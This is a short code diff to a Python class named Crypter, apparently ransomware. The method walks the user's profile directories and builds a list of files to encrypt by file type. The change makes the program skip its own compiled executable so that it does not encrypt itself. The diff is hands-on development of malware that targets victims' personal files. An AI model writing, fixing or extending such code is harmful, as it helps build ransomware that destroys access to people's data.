@@ -199,6 +199,7 @@ class Crypter(Base.Base):
     @summary: Searches the file system and builds a list of files to encrypt
     @return: List of files matching the location and filetype criteria
     '''
+    binary_name = os.path.split(sys.argv[0])[1]
 
     base_dirs = self.get_base_dirs(os.environ['USERPROFILE'])
     file_list = []
@@ -211,7 +212,7 @@ class Crypter(Base.Base):
             if (
                 (self.is_valid_filetype(file)) and
                 (file.lower() not in self.FILES_TO_EXCLUDE) and
-                (file.lower() != __file__)
+                (file.lower() != binary_name.lower())
                 ):
                     file_list.append(os.path.join(path, file))
         for file in subdirs:
@@ -220,7 +221,7 @@ class Crypter(Base.Base):
             if (
                 (self.is_valid_filetype(file)) and
                 (file.lower() not in self.FILES_TO_EXCLUDE) and
-                (file.lower() != __file__)
+                (file.lower() != binary_name.lower())
                 ):
                     file_list.append(os.path.join(path, file))
 
